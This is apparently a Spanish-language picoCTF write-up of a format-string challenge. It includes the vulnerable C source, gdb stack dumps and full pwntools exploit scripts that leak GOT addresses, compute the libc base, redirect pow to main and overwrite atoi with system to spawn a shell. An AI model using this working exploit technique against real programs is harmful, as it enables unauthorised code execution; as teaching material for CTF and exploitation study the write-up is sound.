#pwn #ctf 

# Reconocimiento

Se nos da un binario, su código fuente y un *Dockerfile*.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

#define SIZE 0x100

int main(void)
{
  char A[SIZE];
  char B[SIZE];

  int a = 0;
  int b = 0;

  puts("Welcome to Fermat\\'s Last Theorem as a service");

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);

  A[strcspn(A, "\n")] = 0;
  B[strcspn(B, "\n")] = 0;

  a = atoi(A);
  b = atoi(B);

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}
```

Vemos que el programa es una implementación del *último teorema de Fermat*. Éste dice que no existen tres números que cumplan `x^n + y^n = z^n` para *n* mayor que 2. Por tanto, es imposible que se cumpla la última condición.

El título nos da una pista de que quizás somos capaces de ejecutar un [[format string]]. Si probamos con `%x` no veremos nada porque se ejecuta un *atoi* a nuestro input. Sin embargo, por como funciona dicha función, podemos saltarnos esta restricción colocando un número seguido de nuestro payload: `1 %x`.

# Explotación

La idea será modificar datos de la memoria, pero debemos tener en cuenta que nuestro input se pasa también por una función *snprintf*, por lo que nuestro payload se cortará al enviar *nullbytes*. La estrategia será utilizar el modificador `%n`, colocando los especificadores de formato en *A* y las direcciones en *B*.

## Controlando A y B

Para ello debemos encontrar el offset. Para ello, correremos el programa en [[gdb]]-[[pwndbg]] y leakearemos algunos valores del stack:

```chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
B: 1_ABCDEFG
Calculating for A: 1_0x400bd7.(nil).0x1.(nil).0x73.0x7ffff7fcb878.0x7ffff7fe17e0.0x7ffff7ceaabc.0x100000001.0x2e70252e70255f31.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x187dcd16eb98.0x7ffff7fe8bf5.(nil).0xffff00001f80.(nil).0x7fffffffe200.0x7ffff7ffe101.0x7ffff7ce2740.0x7ffff7ffe8d8.0x7ffff7ffdad0. and B: 1_ABCDEFG
```

```gdb-pwndbg
stack 100
00:0000│ rsp 0x7fffffffda80 —▸ 0x7ffff7fcb878 ◂— 0xc00120000000e
01:0008│-328 0x7fffffffda88 ◂— 0x4000000000000000
02:0010│-320 0x7fffffffda90 ◂— 0x64ffffffff
03:0018│-318 0x7fffffffda98 ◂— 0x100000001
04:0020│-310 0x7fffffffdaa0 ◂— '1_%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
05:0028│-308 0x7fffffffdaa8 ◂— '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
06:0030│-300 0x7fffffffdab0 ◂— '.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
07:0038│-2f8 0x7fffffffdab8 ◂— 'p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
08:0040│-2f0 0x7fffffffdac0 ◂— '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
09:0048│-2e8 0x7fffffffdac8 ◂— '.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
0a:0050│-2e0 0x7fffffffdad0 ◂— 'p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
0b:0058│-2d8 0x7fffffffdad8 ◂— '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
0c:0060│-2d0 0x7fffffffdae0 ◂— '.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
0d:0068│-2c8 0x7fffffffdae8 ◂— 'p.%p.%p.%p.%p.%p.%p.%p.'
0e:0070│-2c0 0x7fffffffdaf0 ◂— '%p.%p.%p.%p.%p.'
0f:0078│-2b8 0x7fffffffdaf8 ◂— 0x2e70252e70252e /* '.%p.%p.' */
10:0080│-2b0 0x7fffffffdb00 ◂— 0x187dcd16eb98
11:0088│-2a8 0x7fffffffdb08 —▸ 0x7ffff7fe8bf5 (dl_main+7893) ◂— lea rsp, [rbp - 0x28]
12:0090│-2a0 0x7fffffffdb10 ◂— 0x0
13:0098│-298 0x7fffffffdb18 ◂— 0xffff00001f80
14:00a0│-290 0x7fffffffdb20 ◂— 0x0
15:00a8│-288 0x7fffffffdb28 —▸ 0x7fffffffe200 ◂— 0x2f656d6f682f0000
16:00b0│-280 0x7fffffffdb30 —▸ 0x7ffff7ffe101 (_rtld_global+4321) ◂— 0x0
17:00b8│-278 0x7fffffffdb38 —▸ 0x7ffff7ce2740 ◂— 0x7ffff7ce2740
18:00c0│-270 0x7fffffffdb40 —▸ 0x7ffff7ffe8d8 —▸ 0x7ffff7fc3160 —▸ 0x7ffff7ec6000 ◂— 0x3010102464c457f
19:00c8│-268 0x7fffffffdb48 —▸ 0x7ffff7ffdad0 (_rtld_global+2736) —▸ 0x7ffff7fcb000 ◂— 0x3010102464c457f
1a:00d0│-260 0x7fffffffdb50 ◂— 0x187dcd08ca6c
1b:00d8│-258 0x7fffffffdb58 —▸ 0x7ffff7ffe2f0 ◂— 0x0
1c:00e0│-250 0x7fffffffdb60 ◂— 0x187dcd126f7b
1d:00e8│-248 0x7fffffffdb68 ◂— 0x4
1e:00f0│-240 0x7fffffffdb70 ◂— 0x0
... ↓        3 skipped
22:0110│-220 0x7fffffffdb90 —▸ 0x7ffff7fc9228 ◂— add byte ptr ss:[rax], al /* '6' */
23:0118│-218 0x7fffffffdb98 ◂— 0x0
24:0120│-210 0x7fffffffdba0 ◂— '1_ABCDEFG'
25:0128│-208 0x7fffffffdba8 ◂— 0x47 /* 'G' */
26:0130│-200 0x7fffffffdbb0 ◂— '/home/naibu3/hac_path/picoCTF/fell'
27:0138│-1f8 0x7fffffffdbb8 ◂— 'ibu3/hac_path/picoCTF/fell'
28:0140│-1f0 0x7fffffffdbc0 ◂— '_path/picoCTF/fell'
29:0148│-1e8 0x7fffffffdbc8 ◂— 'coCTF/fell'
2a:0150│-1e0 0x7fffffffdbd0 ◂— 0x415f485353006c6c /* 'll' */
2b:0158│-1d8 0x7fffffffdbd8 ◂— 'UTH_SOCKTE'
2c:0160│-1d0 0x7fffffffdbe0 ◂— 0x62696c5f5f004554 /* 'TE' */
```

Vemos que los valores introducidos en *A* empiezan a guardarse en el stack a partir del 10:

```gdb-pwndbg
03:0018│-318 0x7fffffffda98 ◂— 0x100000001
04:0020│-310 0x7fffffffdaa0 ◂— '1_%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.[...]'
```

También vemos que los de *B* se guardan en la posición 33 del stack:

```gdb-pwndbg
24:0120│-210 0x7fffffffdba0 ◂— '1_ABCDEFG'
```

Como el programa "leakea" 9 valores más, debemos tenerlos en cuenta, por lo que la posición de *B* sería la 43. Probemos:

```chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%42$p
B: 1_ABCDEFG
Calculating for A: 1_0x4645444342415f31 and B: 1_ABCDEFG
```

Vemos que necesitamos un poco de padding, ya que el valor corresponde a `FEDCBA_1`, por lo que podemos tratar de corregirlo:

```chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%43$p
B: 1_______ABCDEFG
Calculating for A: 1_0x47464544434241 and B: 1_______ABCDEFG
```

## Leakeando direcciones

Para conseguir direcciones de algunas funciones del binario para calcular la dirección base de *glibc* podemos utilizar el siguiente script en [[python]] con [[pwntools]]:

```python
#!/bin/python3

from pwn import *

binary = './chall'
exe = ELF(binary)

def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)

def send_format(io, format, values):
    format_prefix = b'1___'
    values_prefix = b'1_______'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(exe.got['puts'])}")

fmt_first_offset = 43

io = start()
output = send_format(io, f"%{fmt_first_offset}$s".encode("ascii"), p64(exe.got["puts"]))
puts_addr_str = output
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
```

Al ejecutarlo obtendremos la dirección de *puts* tanto en el binario como en la [[GOT]]:

```
[...]
puts() GOT address: 0x601018
[...]
puts() runtime address: 0x7efdc2572980
[...]
```

Vamos a tratar de buscar también la dirección de *atoi*, para ello haremos algunos cambios en el script:

```python
log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")

fmt_first_offset = 43

io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii"), p64(exe.got["puts"]) + p64(exe.got["atoi"]))
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")
```

```
[...]
atoi() GOT address: 0x601058
[...]
atoi() runtime address: 0x7fb777ef94a0
[...]
```

Con estas funciones podemos calcular la versión de *LibC*, pero lo más importante, calcular la dirección base.

## Sobrescribiendo pow

El problema es que como lo afrontamos ahora mismo, solo tenemos una oportunidad, es decir, podemos obtener las direcciones y calcular la dirección base, pero el programa termina y no podemos utilizar dicha información. Por lo que podemos sobrescribir la función *pow* en la [[GOT]] con la dirección de *main*, para que el programa vuelva al inicio.

Esto podemos hacerlo directamente con [[pwntools]]:

```python
io = start()
loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 23)
send_format(io, loop_main_fmt, loop_main_address)
io.interactive()
```

Con la función *fmtstr_split* automatizamos el proceso, pero debemos pasarle el offset, y la cantidad de caracteres que ya han sido escritos por *printf* antes de llegar al `%n` (`Calculating for A: 1___`).

Con esto ya tenemos la forma de calcular las direcciones y una forma de poder volver a ejecutar para explotarlo.

## Sobrescribiendo atoi

Ya solo falta sobrescribir otra función con *system*, para poder llamar a `system("/bin/sh")`. Utilizaremos *atoi*.

El script sería:

```python
#!/bin/python3

from pwn import *

binary = './chall'
exe = ELF(binary)

def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 53607)
    else: return process(binary)

def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)

def send_format(io, format, values):
    format_prefix = b'111_'
    values_prefix = b'1111111_'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")

io = start()

log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")

fmt_first_offset = 43

loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset + 2, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 0x25)
io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii") + loop_main_fmt, p64(exe.got["puts"]) + p64(exe.got["atoi"]) + loop_main_address)
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")

libc.address = puts_addr - libc.symbols["puts"]
assert(libc.address & 0xFFF == 0)

log.info(f"LibC base address: {hex(libc.address)}")

atoi_to_system_fmt, atoi_to_system_address = fmtstr_split(fmt_first_offset, {exe.got["atoi"]: libc.symbols["system"]}, numbwritten = 0x17)
send_format(io, atoi_to_system_fmt, atoi_to_system_address)

send_payload(io, "/bin/sh", "dummy")

io.interactive()
```

Ya solo queda imprimir la flag con *cat*.